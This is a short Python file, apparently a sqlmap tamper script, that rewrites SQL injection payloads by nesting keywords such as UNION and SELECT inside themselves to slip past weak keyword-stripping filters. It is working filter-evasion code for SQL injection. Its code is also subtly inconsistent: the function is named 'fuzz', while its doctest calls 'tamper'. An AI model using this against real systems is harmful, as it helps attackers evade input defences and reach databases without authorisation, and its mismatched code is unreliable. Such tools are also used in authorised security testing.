#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import random
import re


def fuzz(payload, **kwargs):
    """
    Replaces predefined SQL keywords with representations
    suitable for replacement (e.g. .replace("SELECT", "")) filters

    Notes:
        * Useful to bypass very weak custom filters

    >>> random.seed(0)
    >>> tamper('1 UNION SELECT 2--')
    '1 UNIOUNIONN SELESELECTCT 2--'
    """

    keywords = ("UNION", "SELECT", "INSERT", "UPDATE", "FROM", "WHERE")
    retVal = payload


    if payload:
        for keyword in keywords:
            _ = random.randint(1, len(keyword) - 1)
            retVal = re.sub(r"(?i)\b%s\b" % keyword, "%s%s%s" % (keyword[:_], keyword, keyword[_:]), retVal)

    return retVal
